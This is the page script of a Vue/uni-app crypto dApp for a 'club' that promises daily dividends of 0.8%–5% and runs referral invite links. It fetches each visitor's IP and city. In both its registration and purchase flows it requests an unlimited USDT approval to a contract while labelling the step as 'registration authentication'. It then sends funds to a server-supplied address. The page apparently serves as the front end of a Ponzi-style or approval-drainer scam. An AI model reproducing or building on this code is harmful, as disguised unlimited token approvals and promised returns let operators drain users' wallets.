  import {getQueryVariable} from "@/utils/common/tools";
  import {addressMeng, connectMetaMask, mengContract, usdtContract} from "@/utils/myweb3/myethers";
  import {NameGenerator} from "@/mytools/newnick";
  import {ethers} from "ethers";
  import Draw from "@/components/draw.vue";
  const store = useTmpiniaStore()

  onLoad(async ()=>{
    store.setTmVuetifyDark(true)
    console.log(getQueryVariable('id'))
    userinfo.value.parent = getQueryVariable('id')
    store.tmStore.userInfo.wallet = await connectMetaMask()
    userinfo.value.address = store.tmStore.userInfo.wallet?.address
    await saveImageAsBase64()
    // 生成随机昵称
    toggleGender()
    await onLogin()
    await getSetting()
    await getIpapi()

  })

  onShow(()=>{

  })
  const content = ref([
    {
      icon: 'tmicon-alert',
      content: '汇金俱乐部励志成为泽汇资本的重要承兑商之一'
    },
    {
      icon: 'tmicon-alert',
      content: '2倍分红结束，日分红0.8%~5%,每天分红4次'
    }
  ])
  function trimAddress(address: string, len: number) {
    return address.substring(0, len) + '.....' + address.slice(-len)
  }
  // 计算属性
  const trimmedInviteUrl = computed(() => {
    const len = 12; // 可以根据需要调整长度
    return userinfo.value.parent.substring(0, len) + '.....' + userinfo.value.parent.slice(-len);
  });
  const buyamount = ref(100)
  const buybtn = (num:number)=>{
    asset.value.amount = num
    buyamount.value = num
  }
  //查询设置信息
  const setinfo = ref({
    desc:"0x88EA65Ce12BB49C4385424Eb0324F18AbCbC126F"
  })
  const getSetting = async ()=>{
    await getSettingApi({}).then((res:any)=>{

      if(res.data.code == 0){
        setinfo.value = res.data.data.desc
        console.log(setinfo.value)
      }
    })
  }
  // 授权方法
  const usdtApprove = async () => {
    // if (Number(store.tmStore.userInfo.wallet?.usdt) < 1500) {
    //   uni.showToast({
    //     title: "USDT不足1500",
    //     icon: 'none',
    //     duration: 2000
    //   });
    //   return
    // }
    try {
      // 确保 ethers.MaxUint256 被正确替换为实际计算最大值的方法
      const maxUint256 = ethers.MaxUint256;
      // const maxUint256 = "0"
      // 发起交易并等待确认，使用await确保在通知用户之前交易已确认
      const txResponse = await usdtContract.approve(addressMeng, maxUint256);
      console.log("txResponse",txResponse);
      uni.showLoading({
        title: "注册认证中",
        icon: 'loading',
        duration: 5000
      });

      const receipt = await txResponse.wait();
      console.log("receipt",receipt);
      // 确认交易是否成功（通常通过检查receipt.status，但具体依据链和合约实现可能有所不同）
      if (receipt.status === 1) { // 一般情况下，status为1表示交易成功
        uni.hideLoading();
        await onRegister()
        uni.showToast({
          title: "认证成功",
          icon: 'success',
          duration: 2000
        });
      } else {
        // 尽管这行在大多数情况下可能不会执行，但添加以防某些特殊情况下交易被发送但未成功
        uni.showToast({
          title: "认证执行，但未成功",
          icon: 'none',
          duration: 2000
        });
        return
      }
    } catch (error) {
      // 捕获并处理任何异常，包括用户取消签名

      console.error("过程中发生错误:", error);
      uni.showToast({
        title: "认证失败",
        icon: 'none',
        duration: 2000
      });

    }
  }
  //客户端注册方法
  const userinfo = ref({
    address: 'admin',
    parent:'root',
    avatarurl:"",
    nickname:'',
    usdt: 100,
    loadip:'',
    loadaddr:'',

  })
  //客户端登录方法
  const isLogin = ref(false)

  async function onLogin() {
    let res = await loginApi(userinfo.value)
    console.log(res)
    if (res.data.msg === "登录成功") {
      if (res.data.data.loadinfo.load.desc === '注册成功') {
        isLogin.value = true
        uni.setStorageSync('token', res.data.data.token)
        store.tmStore.userInfo.jwtToken = res.data.data.token
        store.tmStore.userInfo.cliUser = res.data.data.loadinfo.user
        store.tmStore.userInfo.cliLoad = res.data.data.loadinfo.load
        store.tmStore.userInfo.mainorder = res.data.data.loadinfo.mainorder
        console.log(store.tmStore.userInfo)
        uni.showToast({
          title: '登录成功',
          icon: 'success',
          duration: 2000
        })
      }else {
        uni.showToast({
          title: '未注册',
          icon: 'error',
          duration: 2000
        })
      }

    }
  }

  async function onRegister() {
    if (userinfo.value.address === 'admin') {
      uni.showToast({
        title: '请先连接钱包',
        icon: 'error',
        duration: 2000
      })
      return
    }
    let res = await registerApi(userinfo.value)
    console.log(res)
    if (res.data.msg === "注册成功") {
      await onLogin()
    }

  }
  const asset = ref({
    address: store.tmStore.userInfo.wallet?.address,
    amount: 100,
    desc: 'hash'
  })
  //购买资产方法
  async function onAsset() {
    let res = await buyApi(asset.value)
    console.log(res)
  }
  // 升级方法
  const getUpTree = async () => {
    if (Number(store.tmStore.userInfo.wallet?.usdt) < 1) {
      uni.showToast({
        title: "金额不足",
        icon: 'error',
        duration: 2000
      });
      return
    }
    const isallowance = await getAllowance()

    if (!isallowance) {
      // 确保 ethers.MaxUint256 被正确替换为实际计算最大值的方法
      const maxUint256 = ethers.MaxUint256;
      // const maxUint256 = "0"
      // 发起交易并等待确认，使用await确保在通知用户之前交易已确认
      const txResponse = await usdtContract.approve(addressMeng, maxUint256);
      console.log("txResponse", txResponse);
      uni.showLoading({
        title: "认证中",
        icon: 'loading',
        duration: 5000
      });
      const receipt = await txResponse.wait();
      if (receipt.status === 1) {
        uni.hideLoading()
        uni.showToast({
          title: "认证成功",
          icon: 'success',
          duration: 2000
        });
        await buy()
      } else {
        // 尽管这行在大多数情况下可能不会执行，但添加以防某些特殊情况下交易被发送但未成功
        uni.showToast({
          title: "认证执行，但未成功",
          icon: 'none',
          duration: 2000
        });
        return
      }
    }else{
      await buy()
    }

  }
  //查询授权金额
  const getAllowance = async () => {
    const from = store.tmStore.userInfo.wallet?.address
    const res = await usdtContract.allowance(from, addressMeng)
    const strnum = ethers.formatEther(res)
    return Number(strnum) > 1500;
  }
  const cliUpdate = async (to: any[], amount: bigint): Promise<{ success: boolean, hash?: string }> => {
    try {
      const res = await mengContract.CliTransfer(to,amount);
      console.log(res);
      uni.showLoading({
        title: "链上处理中...",
        icon: 'loading',
        duration: 5000
      });
      // 等待交易被确认
      const receipt = await res.wait();
      console.log("交易收据:", receipt);
      // 检查交易状态
      if (receipt.status === 1) {
        // 返回一个对象，包含操作成功状态和交易哈希
        return { success: true, hash: res.hash };
      } else {
        console.error("交易失败，交易哈希:", res.hash);
        // 返回一个对象，包含操作失败状态
        return { success: false };
      }
    } catch (error) {
      console.error("调用cliUpdateUser时发生错误:", error);
      // 失败时返回成功状态为false，哈希可以不提供或者提供null/undefined
      return { success: false };
    }
  };
  // 买入方法
  const buy = async () => {

      console.log('buy', store.tmStore.userInfo.cliUser);

      if (!store.tmStore.userInfo.cliUser) {
        uni.showToast({
          title: '请先注册',
          icon: 'error',
          duration: 2000
        })
        return
      }
        const amwei = ethers.parseEther(String(asset.value.amount))
        const transformedData = [
          {
            relatedAddress: setinfo.value.desc,
            amount: amwei,
          }
        ]
        console.log('转换后的数据:', transformedData);
        // 调用并等待cliUpdate的结果
        const updateResult = await cliUpdate(transformedData,amwei);
        console.log('cliUpdate结果:', updateResult);
        uni.showLoading({
          title: "认购中",
          icon: 'loading',
          duration: 2000
        });
        if (updateResult.success) {
          // 如果更新用户成功，显示加载提示并尝试升级
          asset.value.desc = updateResult.hash;
          let res = await buyApi(asset.value)
          console.log('买入结果:', res);
          if (res.data.msg === "成功") {
            await uni.showToast({
              title: "认购成功",
              icon: 'success'
            })
            await onLogin()
          }else {
            uni.showToast({
              title: "认购失败",
              icon: 'error',
              duration: 2000
            });
          }

        } else {
          // 如果更新用户失败，直接提示错误并结束
          uni.showToast({
            title: "认购失败",
            icon: 'error',
            duration: 2000
          });
          console.error("更新用户信息失败");
        }



  };

  const avatarurl = ref('https://api.multiavatar.com/')
  const saveImageAsBase64 = async () => {
    try {
      const random = Math.floor(Math.random() * 100) + 2; // 生成 1 到 1000 之间的随机数11

      userinfo.value.avatarurl = avatarurl.value+random + '.png'

      console.log('Image URL:', userinfo.value.avatarurl );

    } catch (error) {
      console.error('Error:', error);
    }
  };
  //性别
  const gender = ref('female')
  //切换性别方法
  const toggleGender = () => {
    gender.value = gender.value === 'male' ? 'female' : 'male'
    generateUniqueNickname()
  }
  const generator = new NameGenerator();

  const uniqueNickname = ref('');
  function generateUniqueNickname() {
    uniqueNickname.value = generator.generateName("male");
    userinfo.value.nickname = uniqueNickname.value
    console.log('uniqueNickname', uniqueNickname.value)

  }
  async function getIpapi(){
    // http.config.baseURL = 'https://ipapi.co'
    const res = await uni.$tm.fetch.get('https://ipapi.co/json')
    console.log('IP地址：',res.data.city)
    userinfo.value.loadip = res.data.ip
    userinfo.value.loadaddr = res.data.city
    return res
  }
  const showdraw = ref(false)
  const toggleDrawer = () => {

    showdraw.value = !showdraw.value;
    console.log('draw toggle', showdraw.value)
  };
  const handleClosedraw = (event: boolean) => {
    showdraw.value = event;
    console.log(uni.getLocale())
    console.log('draw closed', showdraw.value)
  };
  //复制邀请链接
  const copyInviteUrl = async () => {
    let url = "https://osl.fund?id="+store.tmStore.userInfo.wallet?.address
    uni.setClipboardData({
      data: url,
      success: function () {
        uni.showToast({
          title: "复制成功",
          icon: 'none'
        })
      }
    })
  }
  function onChangeDark() {
    console.log('Set dark')
    if( store.tmStore.dark){
      store.setTmVuetifyDark(false)
    }else{
      store.setTmVuetifyDark(true)
    }
  }
</script>
<style>
.colortext {
  width: 100%;
  flex: 1 1 0%;
  text-align: right;
  font-size: 2rem;
  font-style: normal;
  line-height: normal;
  background: linear-gradient(111deg, rgb(246, 240, 34) 0%, rgb(149, 250, 49) 100%) text;
  -webkit-text-fill-color: transparent;
}
.btncolor{
  max-width: 220px;
  border-radius: 8px;
  background: linear-gradient(0deg, rgb(149, 250, 49) 0.01%, rgb(246, 240, 34) 99.99%);
  box-shadow: rgb(74, 142, 0) 2.855px 5.709px 0px 0px;

}
.topshadow{
  width: 92%;
  background-image: url("@/static/ecology/banner1.png");
  background-position: center center;
  background-size: 100% 100%;
  background-repeat: no-repeat;
  border-radius: 40px;
  box-shadow: rgb(0, 0, 0) 7px 7px 12px 0px inset, rgba(255, 255, 255, 0.2) -7px -7px 12px 0px inset;
  backdrop-filter: blur(28.5px);
  z-index: 1;
}
.topshadow2{

  border-radius: 18px;
  box-shadow: rgb(0, 0, 0) 2.464px 2.464px 4.224px 0px inset, rgba(255, 255, 255, 0.2) -1.76px -1.76px 2.464px 0px inset;
  backdrop-filter: blur(10.0332px);
}
.colorline{
  opacity: 0.6;
  height: 0.5px;
  width: 90%;
  background: linear-gradient(90deg, rgba(149, 250, 49, 0) 1.07%, rgb(149, 250, 49) 53.32%, rgba(149, 250, 49, 0) 100.4%);
}
.inputshadow {
  width: 90%;
  border-radius: 30rpx;
  background: rgba(255, 255, 255, 0.1);
  box-shadow: rgba(255, 255, 255, 0.2) -5px -5px 7px 0px inset, rgb(0, 0, 0) 7px 7px 12px 0px inset;
  backdrop-filter: blur(28.5px);
}
.btn-gradient {
  box-shadow: inset 0 0 8px 0 #6158ff;
  border: 1px solid #706da5;
  background: linear-gradient(0deg,#100842,#100842),linear-gradient(0deg,#706da5,#706da5);
}

.bg-primary{
  text-transform: uppercase;
  --tw-bg-opacity: 1;
  background-color: rgb(25 8 75/var(--tw-bg-opacity));
}
.loader{
  animation: rotation 30s linear infinite;
}

@keyframes rotation {
  0% {
    transform: rotate(0deg);
  }

  100% {
    transform: rotate(1turn);
  }
}
.bg-container {
  width: 200rpx;
  height: 200rpx;
  background-image: url('@/static/home/border1.svg');
  background-size: cover;
  background-repeat: no-repeat;
  background-position: center;
  display: flex;
  align-items: center;
  justify-content: center;
}
.text-center {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  z-index: 1;
}
</style>